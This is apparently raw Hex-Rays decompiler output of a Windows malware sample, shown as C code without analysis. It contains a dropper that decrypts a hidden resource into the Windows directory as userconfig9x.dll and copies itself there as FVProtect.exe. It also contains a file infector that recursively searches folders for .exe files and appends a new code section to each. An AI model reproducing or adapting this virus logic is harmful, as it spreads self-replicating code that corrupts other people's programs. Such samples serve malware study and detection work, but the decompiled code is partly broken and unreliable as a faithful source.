/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401000();
int __cdecl sub_40101E(int a1);
BOOL __cdecl sub_401028(LPCVOID lpBuffer, LPCSTR lpFileName);
BOOL sub_4010DA();
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC hResInfo);
// HRSRC __stdcall FindResourceA(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
char *start();
// int __usercall sub_4120C4@<eax>(int a1@<edi>, _BYTE *a2@<esi>);
// int __usercall sub_41212C@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_4123C9@<eax>(char *a1@<ebx>, int a2@<edi>, char *a3@<esi>);
// int __usercall sub_41253E@<eax>(unsigned int a1@<eax>, int a2@<edi>);
// int __usercall sub_412560@<eax>(int a1@<edi>);

//-------------------------------------------------------------------------
// Data declarations

LPCSTR lpString2 = "userconfig9x.dll"; // idb
CHAR Type[] = "BINARY"; // idb
CHAR aFvprotectExe[] = "FVProtect.exe"; // idb
CHAR String2[] = "\\"; // idb
int dword_4030E8 = 0; // weak
int dword_4125C4 = 2011693056; // weak
int dword_4125C8 = 2012046400; // weak
int dword_4125CC = -68679; // weak
int dword_4125D0 = -69239; // weak
_UNKNOWN unk_4125D4; // weak
int dword_412641 = 2011795738; // weak
int dword_412651 = 2011745443; // weak
int dword_412660 = 2011808391; // weak
int dword_41266F = 2011742374; // weak
int dword_4126DF = 226373697; // weak
int dword_4126FB = 476984; // weak
int dword_4126FF = 476984; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  dword_4030E8 = 214013 * dword_4030E8 + 2531011;
  return (dword_4030E8 >> 16) & 0x7FFF;
}
// 4030E8: using guessed type int dword_4030E8;

//----- (0040101E) --------------------------------------------------------
int __cdecl sub_40101E(int a1)
{
  int result; // eax

  result = a1;
  dword_4030E8 = a1;
  return result;
}
// 4030E8: using guessed type int dword_4030E8;

//----- (00401028) --------------------------------------------------------
BOOL __cdecl sub_401028(LPCVOID lpBuffer, LPCSTR lpFileName)
{
  HMODULE v2; // esi
  HRSRC v3; // ebx
  HGLOBAL v4; // eax
  DWORD v5; // esi
  DWORD i; // ebx
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF
  _BYTE *lpBuffera; // [esp+18h] [ebp+8h]
  CHAR *lpFileNamea; // [esp+1Ch] [ebp+Ch]

  NumberOfBytesWritten = 0;
  v2 = GetModuleHandleA(0);
  v3 = FindResourceA(v2, (LPCSTR)(unsigned __int16)lpBuffer, Type);
  v4 = LoadResource(v2, v3);
  lpBuffera = LockResource(v4);
  if ( !lpBuffera )
    return 0;
  v5 = SizeofResource(v2, v3);
  lpFileNamea = (CHAR *)CreateFileA(lpFileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if ( lpFileNamea == (CHAR *)-1 )
    return 0;
  for ( i = 0; i < v5; ++i )
    lpBuffera[i] ^= sub_401000() % 256;
  WriteFile(lpFileNamea, lpBuffera, v5, &NumberOfBytesWritten, 0);
  CloseHandle(lpFileNamea);
  return NumberOfBytesWritten == v5;
}

//----- (004010DA) --------------------------------------------------------
BOOL sub_4010DA()
{
  CHAR Filename[1056]; // [esp+8h] [ebp-C64h] BYREF
  CHAR String1[1060]; // [esp+428h] [ebp-844h] BYREF
  CHAR Buffer[1056]; // [esp+84Ch] [ebp-420h] BYREF

  GetModuleFileNameA(0, Filename, 0x400u);
  GetWindowsDirectoryA(Buffer, 0x400u);
  GetWindowsDirectoryA(String1, 0x400u);
  if ( Buffer[1054] != 92 )
    lstrcatA(Buffer, String2);
  lstrcatA(Buffer, aFvprotectExe);
  if ( String1[1056] != 92 )
    lstrcatA(String1, String2);
  lstrcatA(String1, lpString2);
  sub_401028((LPCVOID)0x65, String1);
  return CopyFileA(Filename, Buffer, 0);
}

//----- (00412000) --------------------------------------------------------
char *start()
{
  unsigned int i; // esi
  unsigned int v1; // esi
  char *v2; // esi
  _BYTE *v3; // esi
  unsigned int retaddr; // [esp+14h] [ebp+0h]

  dword_4125CC = dword_4125D0;
  for ( i = retaddr & 0xFFFFF000; *(_WORD *)i != 23117; i -= 4096 )
    ;
  dword_4125C4 = i;
  v1 = i + *(_DWORD *)(i + 60);
  if ( *(_WORD *)v1 == 17744 )
  {
    dword_4125C8 = dword_4125C4 + *(_DWORD *)(v1 + 120);
    v2 = (char *)&unk_4125D4;
    do
    {
      v3 = v2 + 4;
      *((_DWORD *)v3 - 1) = sub_4120C4((int)start, v3);
      do
        ++v3;
      while ( *v3 );
      v2 = v3 + 1;
    }
    while ( v2[4] );
    dword_4126FF = ((int (__cdecl *)(int, int))dword_412641)(64, 0x10000);
    dword_4126FB = ((int (__cdecl *)(int))dword_412651)(dword_4126FF);
    dword_4126DF += ((int (*)(void))dword_41266F)();
    sub_412560((int)start);
    ((void (__cdecl *)(int))dword_412660)(dword_4126FF);
  }
  return (char *)start + dword_4125CC;
}
// 412000: could not find valid save-restore pair for edi
// 412000: could not find valid save-restore pair for esi
// 4125C4: using guessed type int dword_4125C4;
// 4125C8: using guessed type int dword_4125C8;
// 4125CC: using guessed type int dword_4125CC;
// 4125D0: using guessed type int dword_4125D0;
// 412641: using guessed type int dword_412641;
// 412651: using guessed type int dword_412651;
// 412660: using guessed type int dword_412660;
// 41266F: using guessed type int dword_41266F;
// 4126DF: using guessed type int dword_4126DF;
// 4126FB: using guessed type int dword_4126FB;
// 4126FF: using guessed type int dword_4126FF;

//----- (004120C4) --------------------------------------------------------
int __usercall sub_4120C4@<eax>(int a1@<edi>, _BYTE *a2@<esi>)
{
  _BYTE *v2; // ebx
  int v3; // edx
  __int16 v4; // ax
  _BYTE *v6; // [esp+0h] [ebp-4h]

  v2 = (_BYTE *)(*(_DWORD *)(a1 + 1476) + *(_DWORD *)(*(_DWORD *)(a1 + 1480) + 12));
  v3 = 0;
  while ( 1 )
  {
    LOBYTE(v4) = *a2;
    HIBYTE(v4) = *v2;
    ++a2;
    ++v2;
    if ( !v4 )
      break;
    if ( (_BYTE)v4 != HIBYTE(v4) )
    {
      a2 = v6;
      ++v3;
      while ( HIBYTE(v4) )
        HIBYTE(v4) = *v2++;
    }
  }
  return *(_DWORD *)(*(_DWORD *)(a1 + 1476)
                   + *(_DWORD *)(*(_DWORD *)(a1 + 1480) + 28)
                   + 4
                   * *(unsigned __int16 *)(*(_DWORD *)(a1 + 1476)
                                         + *(_DWORD *)(*(_DWORD *)(a1 + 1480) + 36)
                                         + 2 * (v3 - 1)))
       + *(_DWORD *)(a1 + 1476);
}
// 4120E7: variable 'v6' is possibly undefined

//----- (0041212C) --------------------------------------------------------
int __usercall sub_41212C@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  int v3; // eax
  int v4; // esi
  int v5; // ecx
  _DWORD *v6; // ebx
  unsigned int v7; // edx
  int v8; // eax
  unsigned int v9; // eax
  int v10; // eax
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // eax
  int v14; // ebx
  int v15; // ebx
  _DWORD *v16; // ebx
  int v17; // eax
  _BYTE *v18; // edi
  int v19; // ecx
  _BYTE *v20; // esi
  int v22; // [esp-8h] [ebp-8h]
  int v23; // [esp-4h] [ebp-4h]

  v2 = (*(int (__stdcall **)(int))(a1 + 1713))(a2);
  (*(void (__stdcall **)(int, unsigned int, int, int))(a1 + 1736))(a2, v2 & 0xFFFFFFFE, a2, v2);
  v3 = (*(int (__stdcall **)(int, int))(a1 + 1492))(a2, 2);
  if ( v3 != -1 )
  {
    *(_DWORD *)(a1 + 1771) = v3;
    (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(a1 + 1538))(*(_DWORD *)(a1 + 1771), 0, 0);
    v4 = *(_DWORD *)(a1 + 1787);
    if ( (*(int (__stdcall **)(_DWORD, int, int))(a1 + 1503))(*(_DWORD *)(a1 + 1771), v4, 64) == 64
      && *(_WORD *)v4 == 23117 )
    {
      *(_DWORD *)(a1 + 1783) = *(_DWORD *)(v4 + 60);
      *(_DWORD *)(a1 + 1775) = (*(int (__stdcall **)(_DWORD, _DWORD, int))(a1 + 1538))(*(_DWORD *)(a1 + 1771), 0, 2);
      (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(a1 + 1538))(*(_DWORD *)(a1 + 1771), *(_DWORD *)(a1 + 1783), 0);
      if ( (*(int (__stdcall **)(_DWORD, int, int))(a1 + 1503))(*(_DWORD *)(a1 + 1771), v4, 224) == 224
        && *(_WORD *)v4 == 17744 )
      {
        (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(a1 + 1538))(*(_DWORD *)(a1 + 1771), *(_DWORD *)(a1 + 1783), 0);
        if ( (*(int (__stdcall **)(_DWORD, int, int))(a1 + 1503))(
               *(_DWORD *)(a1 + 1771),
               v4,
               *(unsigned __int16 *)(v4 + 84) - *(_DWORD *)(a1 + 1783)) == *(unsigned __int16 *)(v4 + 84)
                                                                         - *(_DWORD *)(a1 + 1783) )
        {
          v5 = *(unsigned __int16 *)(v4 + 6);
          if ( *(_WORD *)(v4 + 6) )
          {
            v6 = (_DWORD *)(v4 + 248);
            v7 = 0;
            while ( *v6 != 5394264 )
            {
              v8 = v6[2];
              if ( !v8 )
                v8 = v6[4];
              v9 = v6[3] + v8;
              if ( v9 > v7 )
                v7 = v9;
              v6 += 10;
              if ( !--v5 )
              {
                v10 = v7 / *(_DWORD *)(v4 + 56);
                if ( v7 % *(_DWORD *)(v4 + 56) )
                  ++v10;
                v11 = *(_DWORD *)(v4 + 56) * v10;
                *(_DWORD *)(a1 + 1779) = v11;
                *(_DWORD *)(a1 + 1488) = *(_DWORD *)(v4 + 40) - *(_DWORD *)(a1 + 1779);
                *(_DWORD *)(v4 + 40) = v11;
                v12 = (unsigned int)(*(_DWORD *)(a1 + 1779) + 2048) / *(_DWORD *)(v4 + 56);
                if ( (unsigned int)(*(_DWORD *)(a1 + 1779) + 2048) % *(_DWORD *)(v4 + 56) )
                  ++v12;
                v13 = *(_DWORD *)(v4 + 56) * v12;
                if ( *(_DWORD *)(v4 + 80) >= v13 )
                  *(_DWORD *)(v4 + 80) += 2048;
                else
                  *(_DWORD *)(v4 + 80) = v13;
                v14 = (unsigned __int16)(*(_WORD *)(v4 + 6))++;
                v15 = 40 * v14 + 248;
                if ( (unsigned int)*(unsigned __int16 *)(v4 + 84) - *(_DWORD *)(a1 + 1783) >= v15 + 40 )
                {
                  v16 = (_DWORD *)(v4 + v15);
                  v17 = *(_DWORD *)(a1 + 1775) / *(_DWORD *)(v4 + 60);
                  if ( *(_DWORD *)(a1 + 1775) % *(_DWORD *)(v4 + 60) )
                    ++v17;
                  *(_DWORD *)(a1 + 1775) = *(_DWORD *)(v4 + 60) * v17;
                  if ( *(_DWORD *)(v4 + 208) )
                  {
                    v23 = v4;
                    v22 = a1;
                    v18 = (_BYTE *)(v4 + *(_DWORD *)(v4 + 84));
                    v19 = v18 - (_BYTE *)v16;
                    v20 = v18 - 40;
                    while ( v19 )
                    {
                      *v18-- = *v20--;
                      --v19;
                    }
                    a1 = v22;
                    v4 = v23;
                    *(_DWORD *)(v23 + 208) += 40;
                  }
                  *v16 = 5394264;
                  v16[1] = 0;
                  v16[2] = 2048;
                  v16[3] = *(_DWORD *)(a1 + 1779);
                  v16[4] = 2048;
                  v16[5] = *(_DWORD *)(a1 + 1775);
                  v16[6] = 0;
                  v16[7] = 0;
                  v16[8] = 0;
                  v16[9] = -1073741728;
                  (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(a1 + 1538))(
                    *(_DWORD *)(a1 + 1771),
                    *(_DWORD *)(a1 + 1783),
                    0);
                  (*(void (__stdcall **)(_DWORD, int, int))(a1 + 1514))(
                    *(_DWORD *)(a1 + 1771),
                    v4,
                    *(unsigned __int16 *)(v4 + 84) - *(_DWORD *)(a1 + 1783));
                  (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(a1 + 1538))(
                    *(_DWORD *)(a1 + 1771),
                    *(_DWORD *)(a1 + 1775),
                    0);
                  (*(void (__stdcall **)(_DWORD, int, int))(a1 + 1514))(*(_DWORD *)(a1 + 1771), a1, 2048);
                }
                break;
              }
            }
          }
        }
      }
    }
    (*(void (__stdcall **)(_DWORD))(a1 + 1526))(*(_DWORD *)(a1 + 1771));
  }
  return (*(int (**)(void))(a1 + 1736))();
}

//----- (004123C9) --------------------------------------------------------
int __usercall sub_4123C9@<eax>(char *a1@<ebx>, int a2@<edi>, char *a3@<esi>)
{
  _BYTE *i; // edx
  char v4; // al
  char v5; // al
  char *v6; // edx
  char *v7; // esi
  char v8; // al
  int v9; // eax
  _BYTE *j; // esi
  char *v11; // edx
  char *v12; // esi
  char v13; // al
  int v15; // [esp+0h] [ebp-Ch]
  int v16; // [esp+4h] [ebp-8h]
  int v17; // [esp+8h] [ebp-4h]

  v17 = (*(int (__stdcall **)(int, int))(a2 + 1601))(64, 12288);
  v16 = (*(int (__stdcall **)(int))(a2 + 1617))(v17);
  for ( i = (_BYTE *)v16; ; ++i )
  {
    v4 = *a3++;
    if ( !v4 )
      break;
    *i = v4;
  }
  if ( a1 )
  {
    while ( 1 )
    {
      v5 = *a1++;
      if ( !v5 )
        break;
      *i++ = v5;
    }
  }
  *(_WORD *)i = 92;
  v6 = (char *)(v16 + 4096);
  v7 = (char *)v16;
  while ( 1 )
  {
    v8 = *v7++;
    if ( !v8 )
      break;
    *v6++ = v8;
  }
  strcpy(v6, (const char *)(a2 + 1767));
  v9 = (*(int (__stdcall **)(int, int))(a2 + 1550))(v16 + 4096, v16 + 0x2000);
  v15 = v9;
  while ( v9 )
  {
    if ( !sub_41253E(5u, a2) )
    {
      if ( (*(_DWORD *)(v16 + 0x2000) & 0x10) == 16 )
      {
        if ( *(_BYTE *)(v16 + 8236) != 46 )
          sub_4123C9();
      }
      else
      {
        for ( j = (_BYTE *)(v16 + 8236);
              *j != 46 || j[1] != 101 && j[1] != 69 || j[2] != 120 && j[2] != 88 || j[3] != 101 && j[3] != 69 || j[4];
              ++j )
        {
          if ( !*j )
            goto LABEL_31;
        }
        v11 = *(char **)(a2 + 1787);
        v12 = (char *)v16;
        while ( 1 )
        {
          v13 = *v12++;
          if ( !v13 )
            break;
          *v11++ = v13;
        }
        strcpy(v11, (const char *)(v16 + 8236));
        sub_41212C(a2, *(_DWORD *)(a2 + 1787));
      }
    }
LABEL_31:
    v9 = (*(int (__stdcall **)(int, int))(a2 + 1569))(v15, v16 + 0x2000);
  }
  (*(void (__stdcall **)(int))(a2 + 1587))(v15);
  return (*(int (__stdcall **)(int))(a2 + 1632))(v17);
}

//----- (0041253E) --------------------------------------------------------
int __usercall sub_41253E@<eax>(unsigned int a1@<eax>, int a2@<edi>)
{
  *(_DWORD *)(a2 + 1759) = 1103515245 * *(_DWORD *)(a2 + 1759) + 12345;
  return (*(unsigned int *)(a2 + 1759) * (unsigned __int64)a1) >> 32;
}

//----- (00412560) --------------------------------------------------------
int __usercall sub_412560@<eax>(int a1@<edi>)
{
  (*(void (__stdcall **)(_DWORD, int))(a1 + 1664))(*(_DWORD *)(a1 + 1787), 4096);
  sub_4123C9(0, a1, *(char **)(a1 + 1787));
  (*(void (__stdcall **)(_DWORD, int))(a1 + 1689))(*(_DWORD *)(a1 + 1787), 4096);
  sub_4123C9(0, a1, *(char **)(a1 + 1787));
  sub_4123C9(0, a1, (char *)(a1 + 1766));
  sub_4123C9(0, a1, (char *)(a1 + 1765));
  return sub_4123C9(0, a1, (char *)(a1 + 1764));
}

// nfuncs=10 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
